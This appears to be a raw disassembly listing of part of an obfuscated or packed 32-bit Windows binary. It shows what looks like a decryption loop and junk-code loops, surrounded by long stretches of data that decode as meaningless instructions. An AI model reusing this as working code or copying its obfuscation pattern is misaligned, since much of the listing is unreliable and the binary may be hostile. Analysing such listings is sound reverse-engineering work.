  40296c:	xchg   DWORD PTR [ebx+0x26be8a79],ecx
  402972:	mov    eax,0x39b2cc31
  402977:	nop
  402978:	std    
  402979:	pop    ss
  40297a:	jmp    0xc670a19b
  40297f:	fcomp  DWORD PTR [ebx]
  402981:	in     eax,0x1f
  402983:	in     eax,0xea
  402985:	test   BYTE PTR [edx-0x7a6ed755],0x82
  40298c:	jbe    0x402971
  40298e:	mov    ah,0x82
  402990:	sub    al,BYTE PTR ds:0xe340d60a
  402996:	adc    eax,0xda031999
  40299b:	sub    al,0xfc
  40299d:	(bad)  
  40299e:	and    al,BYTE PTR [ebx]
  4029a0:	mov    al,BYTE PTR [esi]
  4029a2:	mov    ds:0xec7c6dc7,eax
  4029a7:	(bad)  
  4029a8:	out    dx,al
  4029a9:	sbb    ebp,DWORD PTR [eax+0x1cebf535]
  4029af:	dec    esp
  4029b0:	dec    edx
  4029b1:	adc    eax,0x272bb139
  4029b6:	dec    eax
  4029b7:	(bad)  
  4029b9:	mov    ebx,0xee960a43
  4029be:	jl     0x4029e3
  4029c0:	sub    DWORD PTR [ecx-0x61530845],ebx
  4029c6:	mov    ?,ebx
  4029c8:	(bad)  
  4029c9:	jle    0x4029a4
  4029cb:	fiadd  WORD PTR [esp+eiz*8]
  4029ce:	mov    dl,0x2f
  4029d0:	adc    BYTE PTR [eax-0x54],ch
  4029d3:	pop    esi
  4029d4:	ror    BYTE PTR [edx-0x73faeec2],0x2f
  4029db:	leave  
  4029dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029dd:	dec    ebx
  4029de:	add    al,0x2f
  4029e0:	inc    esi
  4029e1:	mov    al,0xa4
  4029e3:	cli    
  4029e4:	cdq    
  4029e5:	data16 jp 0x402a61
  4029e8:	cmp    esi,DWORD PTR [ecx-0x1bfce50f]
  4029ee:	out    dx,eax
  4029ef:	cs fwait
  4029f1:	mov    ss,esi
  4029f3:	fnstsw WORD PTR [eax+0x7e]
  4029f6:	ret    0x6b08
  4029f9:	push   0xffffff8d
  4029fb:	(bad)  
  4029fc:	scas   al,BYTE PTR es:[edi]
  4029fd:	cmp    dl,BYTE PTR [ecx]
  4029ff:	jnp    0x4029bf
  402a01:	ja     0x4029fa
  402a03:	pop    edx
  402a04:	push   ebx
  402a05:	inc    ebp
  402a06:	jmp    0x402a55
  402a08:	popf   
  402a09:	ret    0xf69e
  402a0c:	scas   al,BYTE PTR es:[edi]
  402a0d:	add    edi,DWORD PTR es:[ebp+0x10]
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0xacc72a80,al
  402a42:	ja     0x402aac
  402a44:	or     al,0x7e
  402a46:	jle    0x402a9d
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402aca
  402a4c:	pop    esi
  402a4d:	in     al,0x49
  402a4f:	lods   eax,DWORD PTR ds:[esi]
  402a50:	inc    ebp
  402a51:	push   cs
  402a52:	sar    DWORD PTR [esi+0x671e01c5],0x44
  402a59:	push   es
  402a5a:	ds cmp al,0x1f
  402a5d:	imul   esi,ecx,0xac3af0c4
  402a63:	add    al,0x7b
  402a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a66:	xchg   ebx,eax
  402a67:	push   ss
  402a68:	dec    esp
  402a69:	mov    edx,0x2310fcd4
  402a6e:	jne    0x402a2b
  402a70:	inc    ecx
  402a71:	call   0x738ab5e5
  402a76:	inc    esp
  402a77:	dec    eax
  402a78:	mov    bl,0xb9
  402a7a:	pop    es
  402a7b:	add    BYTE PTR [ecx-0x53],dh
  402a7e:	test   BYTE PTR [eax-0x114f3ad9],dh
  402a84:	mov    BYTE PTR [edi],dh
  402a86:	push   esi
  402a87:	cmp    BYTE PTR [edx-0x933aba3],dl
  402a8d:	aas    
  402a8e:	neg    BYTE PTR [eax]
  402a90:	mov    cl,0xed
  402a92:	and    ah,0x81
  402a95:	pop    esi
  402a96:	in     eax,dx
  402a97:	pop    edx
  402a98:	in     eax,0xb0
  402a9a:	stos   DWORD PTR es:[edi],eax
  402a9b:	pop    esi
  402a9c:	inc    esi
  402a9d:	dec    edi
  402a9e:	ds mov esi,0x4c0ec2c2
  402aa4:	shl    BYTE PTR [ebx+ecx*4-0x51],cl
  402aa8:	mov    edi,DWORD PTR [ebx+0x61cbbe1a]
  402aae:	adc    al,0xc3
  402ab0:	and    ebx,DWORD PTR [esi]
  402ab2:	jecxz  0x402a49
  402ab4:	aam    0x66
  402ab6:	and    BYTE PTR [ebx+ecx*2+0x9],al
  402aba:	imul   eax,DWORD PTR [esi],0x18
  402abd:	outs   dx,DWORD PTR ds:[esi]
  402abe:	ins    DWORD PTR es:[edi],dx
  402abf:	cmp    ecx,0x9c88cd71
  402ac5:	jg     0x402a71
  402ac7:	sub    eax,edx
  402ac9:	dec    esp
  402aca:	or     bh,BYTE PTR [ebx-0x58]
  402acd:	les    edx,FWORD PTR [ebx-0x520a42c6]
  402ad3:	push   0x5d
  402ad5:	push   ss
  402ad6:	sub    DWORD PTR [esi-0x4d7c2864],ebp
  402adc:	mov    esp,0xb1c29ff2
  402ae1:	add    bl,al
  402ae3:	ret    
  402ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ae5:	loopne 0x402b29
  402ae7:	outs   dx,DWORD PTR ds:[esi]
  402ae8:	xor    DWORD PTR ds:0x1f7c2f22,eax
  402aee:	ficom  WORD PTR [ebp-0x7b]
  402af1:	test   eax,0xe9fc8fd9
  402af6:	pop    ecx
  402af7:	mov    eax,0xdada855f
  402afc:	sub    eax,0xdff7d289
  402b01:	std    
  402b02:	cmp    esp,DWORD PTR [edi-0x5e677f2b]
  402b08:	stc    
  402b09:	jmp    0x402af3
  402b0b:	lods   al,BYTE PTR ds:[esi]
  402b0c:	pop    ebx
  402b0d:	mov    ebx,eax
  402b0f:	xchg   ebx,eax
  402b10:	(bad)  
  402b11:	and    al,0x28
  402b13:	push   ecx
  402b14:	in     eax,0x8f
  402b16:	mov    edx,0xca646bb9
  402b1b:	jbe    0x402adc
  402b1d:	push   esp
  402b1e:	inc    esp
  402b1f:	add    DWORD PTR [eax-0x4a],edx
  402b22:	jge    0x402ba3
  402b24:	or     al,0xdc
  402b26:	or     eax,0x75ec628c
  402b2b:	cld    
  402b2c:	cld    
  402b2d:	ins    BYTE PTR es:[edi],dx
  402b2e:	gs pop edi
  402b30:	mov    ecx,0x47a5728b
  402b35:	sti    
  402b36:	aas    
  402b37:	(bad)  
  402b38:	pusha  
  402b39:	mov    eax,0xcf1d3c8d
  402b3e:	inc    esi
  402b3f:	xchg   ecx,eax
  402b40:	lds    esi,FWORD PTR [ecx-0x4f]
  402b43:	xchg   esp,eax
  402b44:	popa   
  402b45:	and    eax,0xc1270ab9
  402b4a:	dec    ebx
  402b4b:	mov    BYTE PTR [ecx],al
  402b4d:	inc    edi
  402b4e:	sub    al,0x27
  402b50:	adc    eax,0xe8783a09
  402b55:	data16 jbe 0x402b77
  402b58:	sub    BYTE PTR [ebp+ebx*8-0x48],0xd9
  402b5d:	dec    ebp
  402b5e:	lods   al,BYTE PTR ds:[esi]
  402b5f:	sbb    DWORD PTR [edi+0x42f0000e],ebp
  402b65:	dec    ebp
  402b66:	sub    DWORD PTR [edi+0x35233bd4],edx
  402b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b6d:	pop    esi
  402b6e:	jl     0x402ba4
  402b70:	dec    eax
  402b71:	sbb    DWORD PTR [edx+edi*4-0x1d],eax
  402b75:	adc    ebx,ebp
  402b77:	mov    ds:0xd5be2a58,al
  402b7c:	rol    BYTE PTR [ecx],1
  402b7e:	jge    0x402bf7
  402b80:	cdq    
  402b81:	popa   
  402b82:	dec    edi
  402b83:	pop    ebx
  402b84:	cmp    DWORD PTR [edi+0x26511e47],ecx
  402b8a:	shl    al,1
  402b8c:	add    bl,BYTE PTR [ebx+edi*1]
  402b8f:	(bad)  
  402b90:	clc    
  402b91:	mov    edi,DWORD PTR [eax+0x6a]
  402b94:	mov    eax,0xe9132dfd
  402b99:	jns    0x402bf6
  402b9b:	mov    cl,0xe3
  402b9d:	adc    BYTE PTR [ebp-0x7cff4599],bl
  402ba3:	and    dh,BYTE PTR [edx-0x18]
  402ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ba7:	cmp    bh,BYTE PTR [esi+0x5a]
  402baa:	adc    ch,BYTE PTR [edx-0x36]
  402bad:	(bad)  
  402bae:	cld    
  402baf:	xor    eax,0x1805a438
  402bb4:	dec    eax
  402bb5:	mov    ds:0x81d23275,eax
  402bba:	jmp    0xc502:0x10ecc4b2
  402bc1:	fld    st(4)
  402bc3:	dec    ecx
  402bc4:	jmp    0x402b85
  402bc6:	sbb    eax,edi
  402bc8:	cmp    dl,BYTE PTR ds:0x7407c5b2
  402bce:	pop    es
  402bcf:	rcr    DWORD PTR [ecx-0x3f],cl
  402bd2:	inc    esp
  402bd3:	dec    ecx
  402bd4:	call   0x341858d8
  402bd9:	pop    esp
  402bda:	stc    
  402bdb:	push   eax
  402bdc:	mov    ds:0x5df76a03,eax
  402be1:	xchg   esp,eax
  402be2:	and    bl,cl
  402be4:	push   esp
  402be5:	push   cs
  402be6:	test   BYTE PTR [edx+0x34541fe1],dl
  402bec:	pop    es
  402bed:	lahf   
  402bee:	jno    0x402b9f
  402bf0:	mov    esp,0xd4f9aaf2
  402bf5:	fimul  DWORD PTR [edi-0x67]
  402bf8:	sar    BYTE PTR [esi-0x17],cl
  402bfb:	inc    edi
  402bfc:	sbb    al,0x7b
  402bfe:	in     eax,0xc5
  402c00:	pushf  
  402c01:	pop    eax
  402c02:	mov    WORD PTR [eax],?
  402c04:	call   0x26fa0aab
  402c09:	imul   eax,DWORD PTR [edx],0x24
  402c0c:	cli    
  402c0d:	test   al,0x4f
  402c0f:	and    esp,esi
  402c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c12:	sbb    eax,0xfcaf05d9
  402c17:	retf   
  402c18:	jae    0x402c8f
  402c1a:	in     eax,dx
  402c1b:	push   esi
  402c1c:	mov    edi,0x5dc65b92
  402c21:	shr    bh,1
  402c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c24:	mov    ebp,0x3f9332a
  402c29:	dec    BYTE PTR [ebx-0x50f0f78b]
  402c2f:	cli    
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x73
  402c6b:	sub    esp,ecx
  402c6d:	daa    
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c0c
  402c77:	jno    0x402caf
  402c79:	test   eax,0xd7ed4038
  402c7e:	pop    eax
  402c7f:	sbb    eax,0x25a02915
  402c84:	loop   0x402c50
  402c86:	mov    dh,0xb7
  402c88:	add    ch,ch
  402c8a:	dec    ebx
  402c8b:	scas   eax,DWORD PTR es:[edi]
  402c8c:	push   es
  402c8d:	adc    al,0xf0
  402c8f:	inc    ebp
  402c90:	and    eax,0xa3c4360
  402c95:	mov    eax,ds:0x8f3c549e
  402c9a:	test   DWORD PTR [edi],edi
  402c9c:	jge    0x402c75
  402c9e:	fwait
  402c9f:	ror    BYTE PTR [esi+0x28],0x3a
  402ca3:	pop    ebp
  402ca4:	scas   al,BYTE PTR es:[edi]
  402ca5:	arpl   WORD PTR [eax],sp
  402ca7:	ret    0x86c1
  402caa:	nop
  402cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cac:	xchg   esp,eax
  402cad:	sbb    BYTE PTR [ecx],0xb9
  402cb0:	(bad)  
  402cb1:	pushf  
  402cb2:	sub    dl,BYTE PTR [esi+edx*2-0x8]
  402cb6:	push   0xffffffdc
  402cb8:	cmp    esi,DWORD PTR [esi+ebp*1-0xe8af451]
  402cbf:	mov    bl,0xa5
  402cc1:	lds    esi,FWORD PTR [edx]
  402cc3:	inc    edi
  402cc4:	mov    eax,0xea285190
  402cc9:	sub    eax,esp
  402ccb:	ins    DWORD PTR es:[edi],dx
  402ccc:	dec    ebp
  402ccd:	jmp    0x402d4d
  402ccf:	(bad)  
  402cd0:	push   ecx
  402cd1:	(bad)  
  402cd4:	ds xchg edi,eax
  402cd6:	ds and ebp,ebx
  402cd9:	inc    edi
  402cda:	(bad)  
  402cdb:	push   esi
  402cdc:	and    eax,0x41090dde
  402ce1:	jle    0x402c6a
  402ce3:	test   DWORD PTR [eax],esp
  402ce5:	cmp    al,0x85
  402ce7:	loope  0x402c8a
  402ce9:	sub    ebx,DWORD PTR [eax+0x17]
  402cec:	ds nop
  402cee:	fisttp WORD PTR ds:0x468e3f83
  402cf4:	repz leave 
  402cf6:	int    0x62
  402cf8:	(bad)  
  402cf9:	imul   ecx,DWORD PTR [eax],0xaac58248
  402cff:	(bad)  
  402d00:	add    al,0x40
  402d02:	pushf  
  402d03:	ja     0x402cbd
  402d05:	cli    
  402d06:	cld    
  402d07:	and    BYTE PTR [edx+0x13814819],ah
  402d0d:	jp     0x402cb5
  402d0f:	or     BYTE PTR [edi+0x6e5f62ef],ch
  402d15:	leave  
  402d16:	mov    BYTE PTR [edi+0x2f],0x8b
  402d1a:	sub    DWORD PTR [edx],edx
  402d1c:	adc    edx,DWORD PTR [edi+ebp*8]
  402d1f:	out    0x3b,eax
  402d21:	rep outs dx,BYTE PTR ds:[esi]
  402d23:	data16 in al,0xb8
  402d26:	call   0xa537a807
  402d2b:	psrlw  mm3,QWORD PTR [ecx+0x63334ba9]
  402d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d33:	iret   
  402d34:	push   ebx
  402d35:	ror    ecx,1
  402d37:	lods   eax,DWORD PTR ds:[esi]
  402d38:	iret   
  402d39:	push   ds
  402d3a:	adc    BYTE PTR [ebp-0x6d919836],dh
  402d40:	sbb    DWORD PTR [ecx-0x15674cbc],ecx
  402d46:	ret    
  402d47:	push   edi
  402d48:	outs   dx,DWORD PTR ds:[esi]
  402d49:	push   edx
  402d4a:	and    al,0x59
  402d4c:	inc    ecx
  402d4d:	pop    esp
  402d4e:	fs das 
  402d50:	add    eax,0x6b5fff02
  402d55:	dec    ebp
  402d56:	add    al,0xa7
  402d58:	(bad)  
  402d5a:	cld    
  402d5b:	fild   QWORD PTR [edx-0x76510275]
  402d61:	int3   
  402d62:	and    BYTE PTR [edi+0x66a9f928],bh
  402d68:	xor    ecx,DWORD PTR [ebx+0x4d]
  402d6b:	push   ecx
  402d6c:	retf   0x3d3d
  402d6f:	mov    BYTE PTR [esi+0x51],0x26
  402d73:	retf   0x784b
  402d76:	push   edx
  402d77:	lea    ebx,[edx]
  402d79:	dec    edx
  402d7a:	into   
  402d7b:	scas   eax,DWORD PTR es:[edi]
  402d7c:	and    BYTE PTR [edx-0xd],0x0
  402d80:	addr16 mov esp,0xe977138a
  402d86:	sbb    ebp,DWORD PTR [ecx]
  402d88:	mov    ecx,0xc44436c1
  402d8d:	call   0x9d16e0ed
  402d92:	or     DWORD PTR es:[ebp-0x42],ebp
  402d96:	rcl    ch,1
  402d98:	inc    ecx
  402d99:	xor    eax,edx
  402d9b:	test   DWORD PTR ds:0xed756f00,esp
  402da1:	inc    eax
  402da2:	inc    eax
  402da3:	cld    
  402da4:	xchg   esp,eax
  402da5:	out    0xfa,eax
  402da7:	adc    eax,0xdc1b85aa
  402dac:	sub    ah,0x44
  402daf:	xchg   BYTE PTR [ebp-0x35],ch
  402db2:	in     al,dx
  402db3:	cmp    dl,dh
  402db5:	mov    BYTE PTR [ebx+0x37],bh
  402db8:	push   ss
  402db9:	imul   edi,DWORD PTR [edi+0x3de8f4ff],0xd124ae51
  402dc3:	or     al,dl
  402dc5:	inc    esi
  402dc6:	(bad)  
  402dc7:	and    esi,ecx
  402dc9:	(bad)  
  402dcb:	mov    esi,0x90c14ce8
  402dd0:	pop    ebp
  402dd1:	push   ds
  402dd2:	cmp    DWORD PTR [esi],edi
  402dd4:	pop    ebp
  402dd5:	es cmp al,0xbb
  402dd8:	bound  ecx,QWORD PTR [esi-0x2560d611]
  402dde:	fidiv  DWORD PTR [esi-0x73]
  402de1:	fwait
  402de2:	dec    di
  402de4:	lods   al,BYTE PTR ds:[esi]
  402de5:	mov    bh,0x0
  402de7:	repnz pop ss
  402de9:	mov    al,ds:0x9b88dea8
  402dee:	bnd ja 0x402e34
  402df1:	mov    dh,0x5b
  402df3:	pop    ebp
  402df4:	push   esp
  402df5:	fwait
  402df6:	int3   
  402df7:	or     al,0x7
  402df9:	nop
  402dfa:	push   esp
  402dfb:	in     al,0x1
  402dfd:	out    0x52,eax
  402dff:	sbb    eax,0x5d5d8824
  402e04:	mov    ebx,0x73ecd86e
  402e09:	adc    bl,BYTE PTR ds:0xf530b930
  402e0f:	jbe    0x402e07
  402e11:	retf   0xf2d5
  402e14:	fmul   DWORD PTR [esi]
  402e16:	pop    ss
  402e17:	xlat   BYTE PTR ds:[ebx]
  402e18:	push   edx
  402e19:	sbb    ecx,DWORD PTR ds:0x191c4010
  402e1f:	dec    ecx
  402e20:	cwde   
  402e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e22:	inc    edx
  402e23:	and    DWORD PTR ds:0x8429bb9b,ebx
  402e29:	loope  0x402e3b
  402e2b:	inc    esp
  402e2c:	adc    cl,BYTE PTR [eax]
  402e2e:	imul   ecx,edi,0xae5639c8
  402e34:	mov    edx,0x19d092e6
  402e39:	pop    ds
  402e3a:	je     0x402e32
  402e3c:	inc    edi
  402e3d:	jmp    0xb6c:0xdb53e66b
  402e44:	icebp  
  402e45:	out    dx,eax
  402e46:	shr    dl,1
  402e48:	and    edi,DWORD PTR [ebx]
  402e4a:	ins    DWORD PTR es:[edi],dx
  402e4b:	sahf   
  402e4c:	add    eax,0xd6da09c
  402e51:	add    esi,DWORD PTR [ebp+0x10]
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e7d0,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x430435
  402e91:	xor    ecx,DWORD PTR ds:0x42edd3
  402e97:	mov    DWORD PTR ds:0x430435,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42edef,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42edef
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42edef,ecx
  402ec9:	cmp    DWORD PTR ds:0x42edef,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42edef,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42ea9b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ede7,0x17
  402efd:	cmp    DWORD PTR ds:0x42ede7,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ede7,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x430449
  402f21:	push   0x42e8b7
  402f26:	call   DWORD PTR ds:0x42e9b3
  402f2c:	cmp    DWORD PTR ds:0x42ede7,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ede7
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ede7,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ede7
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ede7,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42edcf,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42edcf
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42edcf,ecx
  402f71:	cmp    DWORD PTR ds:0x42edcf,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x43046d
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e9c7
  402f8f:	cmp    DWORD PTR ds:0x42edcf,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42edcb,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x430455,0x10
  402faf:	cmp    DWORD PTR ds:0x430455,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x430455,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e82d
  402fd4:	call   DWORD PTR ds:0x42e9cb
  402fda:	cmp    DWORD PTR ds:0x430455,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x430455
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x430455,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x430455
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x430455,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x43046d,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e7c0
  403019:	add    DWORD PTR ds:0x42edf3,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x4304db,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e7c8,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	push   edi
  403050:	jbe    0x4030b8
  403052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403053:	mov    ds:0xae7e7e08,al
  403058:	jg     0x4030d8
  40305a:	jle    0x40306c
  40305c:	or     BYTE PTR [ebp+0x7b],0x23
  403060:	add    cl,BYTE PTR [edx-0x66]
  403063:	inc    esp
  403064:	sbb    edi,DWORD PTR [esi-0x15]
  403067:	aaa    
  403068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403069:	lds    edi,FWORD PTR [esp+eax*8+0x6625ac52]
  403070:	call   0x5779fc69
  403075:	das    
  403076:	jo     0x4030f5
  403078:	call   0xabd7:0xa2683c7d
  40307f:	repz sub eax,0xccf5765f
  403085:	sbb    edi,DWORD PTR [ecx-0x53]
  403088:	shl    DWORD PTR [eax-0x30],0xed
  40308c:	cmp    edi,DWORD PTR [eax]
  40308e:	push   edx
  40308f:	push   es
  403090:	xor    eax,0x21a1ad94
  403095:	xchg   edi,eax
  403096:	fwait
  403097:	fwait
  403098:	les    ecx,FWORD PTR [eax-0x6b]
  40309b:	mov    bh,0x63
  40309d:	(bad)  
  40309e:	push   esp
  40309f:	inc    ecx
  4030a0:	cmp    ebp,0x71919b1c
  4030a6:	bound  edi,QWORD PTR [ebp+0x1d869faa]
  4030ac:	sbb    DWORD PTR [ecx-0x4da0cc77],ebp
  4030b2:	cmp    al,0x6b
  4030b4:	push   ss
  4030b5:	mov    bh,0x95
  4030b7:	call   0x43dfe66c
  4030bc:	jmp    0x9f8d:0x3e001d14
  4030c3:	(bad)  
  4030c4:	or     WORD PTR [ebp-0x71cc170c],di
  4030cb:	dec    ebp
  4030cc:	loop   0x403105
  4030ce:	mov    eax,ds:0x78497f86
  4030d3:	call   0xb7af8edc
  4030d8:	mov    ch,0xf6
  4030da:	and    ch,bh
  4030dc:	(bad)  
  4030dd:	jno    0x403137
  4030df:	addr16 xchg edx,eax
  4030e1:	jmp    0xb9290265
  4030e6:	aad    0x5b
  4030e8:	sub    eax,0x9d4af2bc
  4030ed:	xor    ebp,esp
  4030ef:	inc    ecx
  4030f0:	jg     0x403148
  4030f2:	leave  
  4030f3:	(bad)  [edx+eax*2]
  4030f6:	mov    edx,0x73379ec9
  4030fb:	lock dec ebp
  4030fd:	push   cs
  4030fe:	lahf   
  4030ff:	jb     0x403170
  403101:	sbb    cl,ah
  403103:	retf   
  403104:	ret    
  403105:	rol    BYTE PTR [ebx+esi*8+0x35],cl
  403109:	cwde   
  40310a:	push   ds
  40310b:	in     al,dx
  40310c:	push   ebx
  40310d:	in     eax,0x1
  40310f:	loop   0x403158
  403111:	jge    0x403093
  403113:	iret   
  403114:	fild   QWORD PTR [esi+0x64b29f87]
  40311a:	jmp    0x3f20:0xb9238850
  403121:	pop    eax
  403122:	cdq    
  403123:	mov    ebp,0xb88c6e56
  403128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403129:	sbb    eax,0xe0043dc5
  40312e:	cmp    esp,DWORD PTR [ebx+0x6]
  403131:	popa   
  403132:	or     BYTE PTR [edi],dl
  403134:	stc    
  403135:	pop    eax
  403136:	retf   
  403137:	scas   al,BYTE PTR es:[edi]
  403138:	jp     0x4030e6
  40313a:	pop    ecx
  40313b:	add    BYTE PTR [ecx],bh
  40313d:	retf   
  40313e:	jmp    0x900cde59
  403143:	push   es
  403144:	(bad)  
  403145:	fdiv   st,st(6)
  403147:	lods   al,BYTE PTR ds:[esi]
  403148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403149:	rol    BYTE PTR [ebp+0x2d64a16b],0xbd
  403150:	loopne 0x403151
  403152:	sbb    ah,BYTE PTR [eax+0x4cfb8bf0]
  403158:	test   BYTE PTR [eax],0x39
  40315b:	movups xmm5,xmm0
  40315e:	dec    ebx
  40315f:	ins    BYTE PTR es:[edi],dx
  403160:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403162:	push   ebp
  403163:	sbb    ah,BYTE PTR [edi+0x54df1abd]
  403169:	mov    dl,BYTE PTR [ebx-0x3b4030d]
  40316f:	add    eax,0x4d3d39e4
  403174:	dec    esp
  403175:	xor    DWORD PTR [esi+edi*4+0x68e67422],esp
  40317c:	pop    es
  40317d:	or     DWORD PTR [edx+0x7b657c79],edi
  403183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403184:	sahf   
  403185:	sub    bl,BYTE PTR [eax-0x39]
  403188:	stc    
  403189:	add    ax,0xc7a9
  40318d:	test   eax,0xf9ec19c5
  403192:	jmp    0x4031b5
  403194:	aam    0xe9
  403196:	fidivr DWORD PTR [eax]
  403198:	xchg   BYTE PTR [ecx+0x4e],cl
  40319b:	stos   DWORD PTR es:[edi],eax
  40319c:	mov    ebx,0x26e48f53
  4031a1:	in     al,dx
  4031a2:	sub    BYTE PTR [edi-0x44],ah
  4031a5:	mov    ebp,0xdcd206d2
  4031ab:	daa    
  4031ac:	pop    edx
  4031ad:	out    0xf4,al
  4031af:	mov    ecx,0x7a3d7861
  4031b4:	xchg   ecx,eax
  4031b5:	and    DWORD PTR [edx-0x22],edx
  4031b8:	in     al,0x95
  4031ba:	dec    edx
  4031bb:	nop
  4031bc:	pop    ds
  4031bd:	mov    BYTE PTR [ebp-0x4b2e5ef4],dh
  4031c3:	(bad)  
  4031c4:	and    eax,0xdff88dcc
  4031c9:	xchg   ah,dh
  4031cb:	cmp    esi,DWORD PTR [ebp+0x19]
  4031ce:	ins    BYTE PTR es:[edi],dx
  4031cf:	cmp    BYTE PTR [edx-0x76f693ca],ch
  4031d5:	or     eax,0xa9192602
  4031da:	adc    DWORD PTR [eax],ebx
  4031dc:	lds    esp,FWORD PTR ds:0x9e7999e9
  4031e2:	and    cl,BYTE PTR [edi-0x20]
  4031e5:	cs in  al,0xc4
  4031e8:	mov    esp,0x2c9eaeea
  4031ed:	cmp    DWORD PTR [ebp-0x65f97440],ebx
  4031f3:	push   ds
